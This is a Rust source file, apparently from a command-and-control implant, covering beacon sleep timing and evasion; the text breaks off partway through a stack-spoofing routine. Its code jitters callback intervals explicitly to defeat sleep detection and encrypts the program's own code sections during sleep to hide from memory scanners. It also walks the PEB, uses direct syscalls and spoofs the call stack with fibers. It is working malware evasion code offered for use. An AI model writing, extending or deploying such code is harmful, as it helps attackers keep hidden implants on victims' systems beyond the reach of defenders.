use common::config::SleepConfig;
use anyhow::Result;
#[cfg(windows)]
use common::config::SleepMethod;
use log::debug;
use log::info;
use rand::{thread_rng, Rng, RngCore as _};

pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
    let mut base = config.base_interval_secs as f64;
    if let (Some(start), Some(end), Some(mult)) = (
        config.working_hours_start,
        config.working_hours_end,
        config.off_hours_multiplier,
    ) {
        let now: u32 = {
            // Use local time for working-hours comparison, not UTC.
            #[cfg(unix)]
            {
                let secs = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs() as libc::time_t;
                unsafe {
                    let mut tm: libc::tm = std::mem::zeroed();
                    let lt = libc::localtime_r(&secs, &mut tm);
                    if lt.is_null() {
                        (secs / 3600 % 24) as u32
                    } else {
                        (*lt).tm_hour as u32
                    }
                }
            }
            #[cfg(windows)]
            {
                let mut st: winapi::um::minwinbase::SYSTEMTIME = unsafe { std::mem::zeroed() };
                unsafe { winapi::um::sysinfoapi::GetLocalTime(&mut st) };
                st.wHour as u32
            }
            #[cfg(not(any(unix, windows)))]
            {
                (std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs()
                    / 3600
                    % 24) as u32
            }
        };
        if now < start || now >= end {
            base *= mult as f64;
            debug!("Applying off-hours sleep multiplier: {}", mult);
        }
    }
    let mut rng = thread_rng();
    // Enforce a minimum of ±40% jitter to defeat timing-based sleep detection.
    let jitter_frac = ((config.jitter_percent as f64) / 100.0).max(0.40);
    let jitter_val = base * jitter_frac;
    let offset = rng.gen_range(-jitter_val..=jitter_val);
    std::time::Duration::from_secs_f64((base + offset).max(1.0))
}

#[cfg(windows)]
pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Result<()> {
    match &config.method {
        SleepMethod::Ekko | SleepMethod::Foliage => {
            // Delegate to the advanced sleep_obfuscation module which provides
            // full memory encryption (XChaCha20-Poly1305), stack spoofing,
            // PE header zeroing, and PEB unlinking — superseding the legacy
            // Ekko/Foliage path.
            #[cfg(target_arch = "x86_64")]
            {
                info!(
                    "Initiating advanced sleep obfuscation for {:?}",
                    duration
                );
                let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
                soc.sleep_duration_ms = duration.as_millis() as u64;
                soc.encrypt_stack = config.sleep_mask_enabled;
                soc.encrypt_heap = false;
                // Key rotation and anti-forensics always active when using
                // the advanced path.
                soc.anti_forensics = true;
                soc.spoof_return_address = true;
                // Ekko/Foliage map to the Ekko variant (NtDelayExecution).
                soc.variant = crate::sleep_obfuscation::SleepVariant::Ekko;
                return crate::sleep_obfuscation::secure_sleep(soc);
            }
            #[cfg(not(target_arch = "x86_64"))]
            {
                info!("Initiating Foliage-style sleep for {:?}", duration);
                if config.sleep_mask_enabled {
                    unsafe {
                        let mut key = [0u8; 32];
                        rand::thread_rng().fill_bytes(&mut key);
                        let mut sections = stack_mask::encrypt_with_key(&key);
                        std::thread::sleep(duration);
                        stack_mask::decrypt_with_key(&mut sections, &key);
                        core::ptr::write_volatile(&mut key, [0u8; 32]);
                    }
                } else {
                    std::thread::sleep(duration);
                }
                return Ok(());
            }
        }
        SleepMethod::Cronus => {
            // Cronus: waitable-timer-based sleep (NtSetTimer).
            // Falls back to Ekko if timer APIs unavailable.
            #[cfg(target_arch = "x86_64")]
            {
                info!(
                    "Initiating Cronus sleep obfuscation for {:?}",
                    duration
                );
                let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
                soc.sleep_duration_ms = duration.as_millis() as u64;
                soc.encrypt_stack = config.sleep_mask_enabled;
                soc.encrypt_heap = false;
                soc.anti_forensics = true;
                soc.spoof_return_address = true;
                soc.variant = crate::sleep_obfuscation::SleepVariant::Cronus;
                return crate::sleep_obfuscation::secure_sleep(soc);
            }
            #[cfg(not(target_arch = "x86_64"))]
            {
                // Fall through to standard sleep on non-x86_64.
                info!("Cronus not supported on non-x86_64, using standard sleep");
                std::thread::sleep(duration);
                return Ok(());
            }
        }
        _ => {
            if config.sleep_mask_enabled {
                info!("Sleep-mask active for {:?}", duration);
                unsafe {
                    let mut key = [0u8; 32];
                    rand::thread_rng().fill_bytes(&mut key);
                    let mut sections = stack_mask::encrypt_with_key(&key);
                    std::thread::sleep(duration);
                    stack_mask::decrypt_with_key(&mut sections, &key);
                    core::ptr::write_volatile(&mut key, [0u8; 32]);
                }
            } else {
                info!("Standard sleep for {:?}", duration);
                std::thread::sleep(duration);
            }
            Ok(())
        }
    }
}

/// Non-Windows sleep with optional sleep-mask encryption.
///
/// When `config.sleep_mask_enabled` is `true`, the `.text` and `.rdata`
/// sections are encrypted with a per-sleep ChaCha20 key held on the stack
/// for the duration of the sleep window.  When `false`, the existing
/// `crypto::encrypt_sections` path (heap key page) is used unchanged.
#[cfg(not(windows))]
pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Result<()> {
    if config.sleep_mask_enabled {
        info!("Sleep-mask active (stack-local key) for {:?}", duration);
        unsafe {
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            let mut sections = stack_mask::encrypt_with_key(&key);
            std::thread::sleep(duration);
            stack_mask::decrypt_with_key(&mut sections, &key);
            // Volatile write to prevent the compiler from treating the zero
            // as a dead store.
            core::ptr::write_volatile(&mut key, [0u8; 32]);
        }
    } else {
        info!("Sleep-time memory encryption active for {:?}", duration);
        crypto::encrypt_sections();
        std::thread::sleep(duration);
        crypto::decrypt_sections();
    }
    Ok(())
}

pub mod crypto {
    use chacha20::ChaCha20;
    use chacha20::cipher::{KeyIvInit, StreamCipher};
    use rand::RngCore;

    /// A section whose bytes have been XOR-encrypted in-place with a ChaCha20
    /// keystream.  The `nonce` is the only per-section state needed to decrypt;
    /// the 32-byte session key lives on the separate key page.
    struct EncryptedSection {
        addr: *mut u8,
        size: usize,
        /// Windows: PAGE_* constant. Unix: libc::PROT_* flags stored as u32.
        orig_prot: u32,
        /// Per-section ChaCha20 nonce (12 bytes).
        nonce: [u8; 12],
    }

    thread_local! {
        /// Pointer to the mmap/VirtualAlloc'd key page.  Null when no session
        /// is active.  The key is stored at offset 0, 32 bytes long, on a page
        /// that is *not* part of the encrypted sections.
        static KEY_PAGE: std::cell::Cell<*mut u8> =
            const { std::cell::Cell::new(std::ptr::null_mut()) };
        static KEY_PAGE_LEN: std::cell::Cell<usize> =
            const { std::cell::Cell::new(0) };
        static SESSION_INITIALIZED: std::cell::Cell<bool> =
            const { std::cell::Cell::new(false) };
        static ENCRYPTED_SECTIONS: std::cell::RefCell<Vec<EncryptedSection>> =
            const { std::cell::RefCell::new(Vec::new()) };
    }

    // ── Key-page allocation / deallocation ───────────────────────────────

    /// Allocate a private anonymous page to hold the 32-byte session key.
    /// Returns (ptr, length) or (null, 0) on failure.
    #[cfg(not(windows))]
    unsafe fn alloc_key_page() -> (*mut u8, usize) {
        let page_size = libc::sysconf(libc::_SC_PAGESIZE);
        let page_size = if page_size > 0 { page_size as usize } else { 4096 };
        let ptr = libc::mmap(
            std::ptr::null_mut(),
            page_size,
            libc::PROT_READ | libc::PROT_WRITE,
            libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
            -1,
            0,
        );
        if ptr == libc::MAP_FAILED {
            log::error!("alloc_key_page: mmap failed: {}", std::io::Error::last_os_error());
            return (std::ptr::null_mut(), 0);
        }
        (ptr as *mut u8, page_size)
    }

    #[cfg(windows)]
    unsafe fn alloc_key_page() -> (*mut u8, usize) {
        use winapi::um::memoryapi::VirtualAlloc;
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
        let page_size = 4096usize;
        let ptr = VirtualAlloc(
            std::ptr::null_mut(),
            page_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if ptr.is_null() {
            log::error!("alloc_key_page: VirtualAlloc failed: {}", std::io::Error::last_os_error());
            return (std::ptr::null_mut(), 0);
        }
        (ptr as *mut u8, page_size)
    }

    /// Zero the key bytes on the page, then release the page.
    #[cfg(not(windows))]
    unsafe fn free_key_page(page: *mut u8, len: usize) {
        if !page.is_null() && len > 0 {
            // Volatile zero to prevent the optimizer from eliding it.
            std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
            libc::munmap(page as *mut libc::c_void, len);
        }
    }

    #[cfg(windows)]
    unsafe fn free_key_page(page: *mut u8, len: usize) {
        let _ = len;
        if !page.is_null() {
            std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
            winapi::um::memoryapi::VirtualFree(
                page as *mut winapi::ctypes::c_void,
                0,
                winapi::um::winnt::MEM_RELEASE,
            );
        }
    }

    // ── Memory-protection helpers ─────────────────────────────────────────

    #[cfg(windows)]
    pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, new_protect: u32, old_protect: &mut u32) -> bool {
        let mut region_size = size;
        let mut base_addr = addr as *mut winapi::ctypes::c_void;

        #[cfg(feature = "direct-syscalls")]
        {
            let status = crate::syscalls::syscall_NtProtectVirtualMemory(
                (-1isize) as usize as u64,
                &mut base_addr as *mut _ as usize as u64,
                &mut region_size as *mut _ as usize as u64,
                new_protect as u64,
                old_protect as *mut _ as usize as u64,
            );
            if status != 0 {
                log::error!(
                    "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
                    addr, size, status
                );
                return false;
            }
            true
        }
        #[cfg(not(feature = "direct-syscalls"))]
        {
            if winapi::um::memoryapi::VirtualProtect(base_addr, region_size, new_protect, old_protect) == 0 {
                log::error!(
                    "VirtualProtect failed for {:p} (size={}): {}",
                    addr, size,
                    std::io::Error::last_os_error()
                );
                return false;
            }
            true
        }
    }

    #[cfg(not(windows))]
    pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, prot: i32) -> bool {
        let page_size = libc::sysconf(libc::_SC_PAGESIZE);
        let page_size = if page_size > 0 { page_size as usize } else { 4096usize };
        let aligned = (addr as usize) & !(page_size - 1);
        let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
        if libc::mprotect(aligned as *mut libc::c_void, aligned_size, prot) != 0 {
            log::error!(
                "mprotect failed for {:p} (size={}): {}",
                addr, size,
                std::io::Error::last_os_error()
            );
            return false;
        }
        true
    }

    // ── Section discovery ─────────────────────────────────────────────────

    #[cfg(windows)]
    pub(super) unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
        use winapi::um::winnt::{
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
            IMAGE_SECTION_HEADER,
        };

        let mut sections = Vec::new();
        #[cfg(target_arch = "x86_64")]
        let base: *mut winapi::shared::minwindef::HINSTANCE__ = {
            let teb: usize;
            core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
            let peb = *((teb + 0x60) as *const usize) as *const u8;
            *(peb.add(0x10) as *const usize) as *mut _
        };
        #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
        let base: *mut winapi::shared::minwindef::HINSTANCE__ = {
            let teb: usize;
            core::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
            let peb = *((teb + 0x60) as *const usize) as *const u8;
            *(peb.add(0x10) as *const usize) as *mut _
        };
        #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
        let base: *mut winapi::shared::minwindef::HINSTANCE__ = std::ptr::null_mut();
        if base.is_null() {
            return sections;
        }

        let dos = base as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return sections;
        }

        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return sections;
        }

        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;
        for _ in 0..(*nt).FileHeader.NumberOfSections {
            let name = (*section).Name;
            if name[0..5] == [b'.', b't', b'e', b'x', b't']
                || name[0..6] == [b'.', b'r', b'd', b'a', b't', b'a']
            {
                let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
                let size = *(*section).Misc.VirtualSize() as usize;
                sections.push((addr, size));
            }
            section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
        }
        sections
    }

    /// Parse /proc/self/maps to find executable and read-only sections belonging
    /// to the current binary.  Returns (addr, size, original_prot) tuples.
    #[cfg(not(windows))]
    pub(super) unsafe fn get_code_sections() -> Vec<(*mut u8, usize, i32)> {
        use std::io::{BufRead, BufReader};
        let exe_path = match std::env::current_exe() {
            Ok(p) => p.to_string_lossy().to_string(),
            Err(_) => return Vec::new(),
        };
        let f = match std::fs::File::open("/proc/self/maps") {
            Ok(f) => f,
            Err(_) => return Vec::new(),
        };
        let mut sections = Vec::new();
        for line in BufReader::new(f).lines().map_while(Result::ok) {
            if !line.contains("r-xp") && !line.contains("r--p") {
                continue;
            }
            if !line.contains(&exe_path) {
                continue;
            }
            let mut fields = line.split_whitespace();
            let addr_range = match fields.next() { Some(r) => r, None => continue };
            let perms = match fields.next() { Some(p) => p, None => continue };
            let orig_prot = {
                let exec = perms.as_bytes().get(2).copied() == Some(b'x');
                if exec { libc::PROT_READ | libc::PROT_EXEC } else { libc::PROT_READ }
            };
            let mut parts = addr_range.splitn(2, '-');
            let start_hex = parts.next().unwrap_or("0");
            let end_hex = parts.next().unwrap_or("0");
            let start = usize::from_str_radix(start_hex, 16).unwrap_or(0);
            let end   = usize::from_str_radix(end_hex,   16).unwrap_or(0);
            if start == 0 || end <= start { continue; }
            sections.push((start as *mut u8, end - start, orig_prot));
        }
        sections
    }

    // ── Core encrypt / decrypt (Windows) ─────────────────────────────────

    #[cfg(windows)]
    pub fn encrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::guard_memory();
            return;
        }

        #[cfg(not(feature = "memory-guard"))]
        unsafe {
            ENCRYPTED_SECTIONS.with(|s| { s.borrow_mut().clear(); });
            SESSION_INITIALIZED.with(|c| c.set(false));

            // Allocate a separate page to hold the session key.
            let (kp, kplen) = alloc_key_page();
            if kp.is_null() {
                log::error!("encrypt_sections: failed to allocate key page — aborting");
                return;
            }

            // Generate a 32-byte random key and write it to the key page.
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);

            KEY_PAGE.with(|c| c.set(kp));
            KEY_PAGE_LEN.with(|c| c.set(kplen));

            let mut encrypted_count = 0usize;
            for (addr, size) in get_code_sections() {
                if addr.is_null() || size == 0 { continue; }

                let mut old_protect = 0u32;
                if !protect_region(addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect) {
                    continue;
                }

                // Generate a fresh per-section nonce.
                let mut nonce_bytes = [0u8; 12];
                rand::thread_rng().fill_bytes(&mut nonce_bytes);

                // Read key from the key page, XOR the section in-place.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                {
                    let mut cipher = ChaCha20::new(
                        chacha20::Key::from_slice(&key_copy),
                        chacha20::Nonce::from_slice(&nonce_bytes),
                    );
                    cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
                }
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);

                // Lock the section down to NOACCESS.
                let mut temp = 0u32;
                if !protect_region(addr, size, winapi::um::winnt::PAGE_NOACCESS, &mut temp) {
                    // Could not lock — undo the XOR so the section is sane again.
                    if protect_region(addr, size, old_protect, &mut temp) {
                        let mut key_copy2 = [0u8; 32];
                        std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
                        let mut cipher2 = ChaCha20::new(
                            chacha20::Key::from_slice(&key_copy2),
                            chacha20::Nonce::from_slice(&nonce_bytes),
                        );
                        cipher2.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
                        std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                    }
                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
                    continue;
                }

                ENCRYPTED_SECTIONS.with(|s| {
                    s.borrow_mut().push(EncryptedSection {
                        addr,
                        size,
                        orig_prot: old_protect,
                        nonce: nonce_bytes,
                    });
                });
                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
                encrypted_count += 1;
            }

            if encrypted_count > 0 {
                SESSION_INITIALIZED.with(|c| c.set(true));
            } else {
                // Nothing was encrypted — release the key page now.
                free_key_page(kp, kplen);
                KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
                KEY_PAGE_LEN.with(|c| c.set(0));
            }
        }
    }

    #[cfg(windows)]
    pub fn decrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::unguard_memory();
            return;
        }

        #[cfg(not(feature = "memory-guard"))]
        unsafe {
            if !SESSION_INITIALIZED.with(|c| c.get()) {
                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                return;
            }
            SESSION_INITIALIZED.with(|c| c.set(false));

            let kp    = KEY_PAGE.with(|c| c.get());
            let kplen = KEY_PAGE_LEN.with(|c| c.get());

            let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
            for mut section in sections {
                if section.addr.is_null() || section.size == 0 { continue; }

                let mut rw_prev = 0u32;
                if !protect_region(section.addr, section.size, winapi::um::winnt::PAGE_READWRITE, &mut rw_prev) {
                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
                    continue;
                }

                // XOR the section again with the same key+nonce to decrypt in-place.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                {
                    let mut cipher = ChaCha20::new(
                        chacha20::Key::from_slice(&key_copy),
                        chacha20::Nonce::from_slice(&section.nonce),
                    );
                    cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.size));
                }
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);

                let mut restore_prev = 0u32;
                let _ = protect_region(section.addr, section.size, section.orig_prot, &mut restore_prev);
            }

            // Zero and release the key page.
            free_key_page(kp, kplen);
            KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
            KEY_PAGE_LEN.with(|c| c.set(0));
        }
    }

    // ── Core encrypt / decrypt (Linux / non-Windows) ──────────────────────

    #[cfg(not(windows))]
    pub fn encrypt_sections() {
        unsafe {
            ENCRYPTED_SECTIONS.with(|s| { s.borrow_mut().clear(); });
            SESSION_INITIALIZED.with(|c| c.set(false));

            // Allocate a private anonymous page to hold the session key.
            // This page is not part of any executable section and will not be
            // included in the XOR pass.
            let (kp, kplen) = alloc_key_page();
            if kp.is_null() {
                log::error!("encrypt_sections: failed to allocate key page — aborting");
                return;
            }

            // Generate random 32-byte key and write to key page.
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);

            KEY_PAGE.with(|c| c.set(kp));
            KEY_PAGE_LEN.with(|c| c.set(kplen));

            let mut encrypted_count = 0usize;
            for (addr, size, orig_prot) in get_code_sections() {
                if addr.is_null() || size == 0 { continue; }

                // Make region writable so we can XOR it in-place.
                if !protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
                    continue;
                }

                // Generate a fresh per-section nonce.
                let mut nonce_bytes = [0u8; 12];
                rand::thread_rng().fill_bytes(&mut nonce_bytes);

                // Read key from the key page, XOR the section in-place.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                {
                    let mut cipher = ChaCha20::new(
                        chacha20::Key::from_slice(&key_copy),
                        chacha20::Nonce::from_slice(&nonce_bytes),
                    );
                    cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
                }
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);

                // Lock the section to PROT_NONE.
                if !protect_region(addr, size, libc::PROT_NONE) {
                    // Could not lock — undo XOR so the section stays consistent.
                    if protect_region(addr, size, orig_prot) {
                        let mut key_copy2 = [0u8; 32];
                        std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
                        let mut cipher2 = ChaCha20::new(
                            chacha20::Key::from_slice(&key_copy2),
                            chacha20::Nonce::from_slice(&nonce_bytes),
                        );
                        cipher2.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
                        std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                    }
                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
                    continue;
                }

                ENCRYPTED_SECTIONS.with(|s| {
                    s.borrow_mut().push(EncryptedSection {
                        addr,
                        size,
                        orig_prot: orig_prot as u32,
                        nonce: nonce_bytes,
                    });
                });
                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
                encrypted_count += 1;
            }

            if encrypted_count > 0 {
                SESSION_INITIALIZED.with(|c| c.set(true));
            } else {
                free_key_page(kp, kplen);
                KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
                KEY_PAGE_LEN.with(|c| c.set(0));
            }
        }
    }

    #[cfg(not(windows))]
    pub fn decrypt_sections() {
        unsafe {
            if !SESSION_INITIALIZED.with(|c| c.get()) {
                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                return;
            }
            SESSION_INITIALIZED.with(|c| c.set(false));

            let kp    = KEY_PAGE.with(|c| c.get());
            let kplen = KEY_PAGE_LEN.with(|c| c.get());

            let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
            for mut section in sections {
                if section.addr.is_null() || section.size == 0 { continue; }

                if !protect_region(section.addr, section.size, libc::PROT_READ | libc::PROT_WRITE) {
                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
                    continue;
                }

                // XOR the section again with the same key+nonce to recover plaintext.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                {
                    let mut cipher = ChaCha20::new(
                        chacha20::Key::from_slice(&key_copy),
                        chacha20::Nonce::from_slice(&section.nonce),
                    );
                    cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.size));
                }
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);

                // Restore the original page protection.
                let _ = protect_region(section.addr, section.size, section.orig_prot as i32);
            }

            // Zero and release the key page.
            free_key_page(kp, kplen);
            KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
            KEY_PAGE_LEN.with(|c| c.set(0));
        }
    }
}

/// Stack-local-key section encryption helpers for the sleep-mask feature.
///
/// Unlike the [`crypto`] module, which allocates a separate memory page for
/// the session key, these helpers accept the 32-byte key by reference so the
/// caller can hold it in a **stack-local** variable.  Only the per-section
/// nonces and addresses are stored on the heap (inside the returned
/// `Vec<SectionEntry>`).  This prevents memory-scanning tools from locating
/// the key via known global or thread-local offsets.
pub mod stack_mask {
    use chacha20::ChaCha20;
    use chacha20::cipher::{KeyIvInit, StreamCipher};
    use rand::RngCore;

    /// Per-section state required to decrypt after sleep.
    pub struct SectionEntry {
        pub addr: *mut u8,
        pub len: usize,
        /// Original page-protection flags (Windows PAGE_* or POSIX PROT_*).
        pub orig_prot: u32,
        /// Per-section ChaCha20 nonce (12 bytes); zeroed after decryption.
        pub nonce: [u8; 12],
    }

    // SAFETY: SectionEntry holds a raw pointer into the current process image.
    // Access is confined to the single calling thread within `execute_sleep`.
    unsafe impl Send for SectionEntry {}
    unsafe impl Sync for SectionEntry {}

    /// Encrypt all code sections in-place using `key`.
    ///
    /// For each section the page is made writable with `VirtualProtect`, the
    /// bytes are XOR'd with a ChaCha20 keystream, and the original protection
    /// is restored.  Returns per-section state needed for decryption.
    #[cfg(windows)]
    pub unsafe fn encrypt_with_key(key: &[u8; 32]) -> Vec<SectionEntry> {
        let sections = super::crypto::get_code_sections();
        let mut result = Vec::with_capacity(sections.len());
        for (addr, size) in sections {
            if addr.is_null() || size == 0 {
                continue;
            }
            let mut orig_prot = 0u32;
            if !super::crypto::protect_region(
                addr,
                size,
                winapi::um::winnt::PAGE_READWRITE,
                &mut orig_prot,
            ) {
                continue;
            }
            let mut nonce = [0u8; 12];
            rand::thread_rng().fill_bytes(&mut nonce);
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&nonce),
                );
                cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
            }
            // Restore original protection so that page-permission bookkeeping
            // matches OS expectations throughout the sleep window.
            let mut dummy = 0u32;
            let _ = super::crypto::protect_region(addr, size, orig_prot, &mut dummy);
            result.push(SectionEntry { addr, len: size, orig_prot, nonce });
        }
        result
    }

    /// Decrypt sections previously encrypted by [`encrypt_with_key`].
    ///
    /// Each section is made writable, XOR'd with the same keystream to recover
    /// the original bytes, and the original protection is restored.
    /// Per-section nonces are zeroed in place after use.
    #[cfg(windows)]
    pub unsafe fn decrypt_with_key(sections: &mut Vec<SectionEntry>, key: &[u8; 32]) {
        for section in sections.iter_mut() {
            if section.addr.is_null() || section.len == 0 {
                continue;
            }
            let mut dummy = 0u32;
            if !super::crypto::protect_region(
                section.addr,
                section.len,
                winapi::um::winnt::PAGE_READWRITE,
                &mut dummy,
            ) {
                core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
                continue;
            }
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&section.nonce),
                );
                cipher.apply_keystream(
                    std::slice::from_raw_parts_mut(section.addr, section.len),
                );
            }
            core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
            let mut dummy2 = 0u32;
            let _ = super::crypto::protect_region(
                section.addr,
                section.len,
                section.orig_prot,
                &mut dummy2,
            );
        }
    }

    /// Non-Windows: encrypt using `mprotect` to make sections writable.
    #[cfg(not(windows))]
    pub unsafe fn encrypt_with_key(key: &[u8; 32]) -> Vec<SectionEntry> {
        let sections = super::crypto::get_code_sections();
        let mut result = Vec::with_capacity(sections.len());
        for (addr, size, orig_prot) in sections {
            if addr.is_null() || size == 0 {
                continue;
            }
            if !super::crypto::protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
                continue;
            }
            let mut nonce = [0u8; 12];
            rand::thread_rng().fill_bytes(&mut nonce);
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&nonce),
                );
                cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
            }
            let _ = super::crypto::protect_region(addr, size, orig_prot);
            result.push(SectionEntry {
                addr,
                len: size,
                orig_prot: orig_prot as u32,
                nonce,
            });
        }
        result
    }

    /// Non-Windows: decrypt using `mprotect` to make sections writable.
    #[cfg(not(windows))]
    pub unsafe fn decrypt_with_key(sections: &mut Vec<SectionEntry>, key: &[u8; 32]) {
        for section in sections.iter_mut() {
            if section.addr.is_null() || section.len == 0 {
                continue;
            }
            if !super::crypto::protect_region(
                section.addr,
                section.len,
                libc::PROT_READ | libc::PROT_WRITE,
            ) {
                core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
                continue;
            }
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&section.nonce),
                );
                cipher.apply_keystream(
                    std::slice::from_raw_parts_mut(section.addr, section.len),
                );
            }
            core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
            let _ = super::crypto::protect_region(
                section.addr,
                section.len,
                section.orig_prot as i32,
            );
        }
    }
}

pub mod spoof {
    // Thread-local state for fiber-based stack spoofing.
    thread_local! {
        pub(super) static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
            const { std::cell::Cell::new(std::ptr::null_mut()) };
        pub(super) static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
            const { std::cell::Cell::new(std::ptr::null_mut()) };
        pub(super) static SLEEP_DURATION_NS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
        pub(super) static LAST_SWITCH_SUCCEEDED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
    }

    #[cfg(windows)]
    pub fn spoof_stack() -> bool {
        // Convert the current thread to a fiber so we can switch away from it.
        // This hides the current call stack during the sleep window.
        unsafe {
            use winapi::um::winbase::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

            LAST_SWITCH_SUCCEEDED.with(|c| c.set(false));

            // Only convert once per thread
            let main_fiber = MAIN_FIBER.with(|f| f.get());
            let main_fiber = if main_fiber.is_null() {
                let f = ConvertThreadToFiber(std::ptr::null_mut());
                if !f.is_null() {
                    MAIN_FIBER.with(|cell| cell.set(f));
                }
                f
            } else {
                main_fiber
            };

            if main_fiber.is_null() {
                log::warn!("spoof_stack: ConvertThreadToFiber failed");
                return false;
            }

            // Create the sleep fiber if not yet created
            let sleep_fiber = SLEEP_FIBER.with(|f| f.get());
            let sleep_fiber = if sleep_fiber.is_null() {
                extern "system" fn sleep_fiber_proc(_param: *mut std::ffi::c_void) {
                    unsafe {
                        loop {
                            let ns = SLEEP_DURATION_NS.with(|c| c.get());
                            if ns > 0 {
                                // Sleep via NtDelayExecution-like spin using SleepEx
                                let ms = (ns / 1_000_000).max(1) as u32;
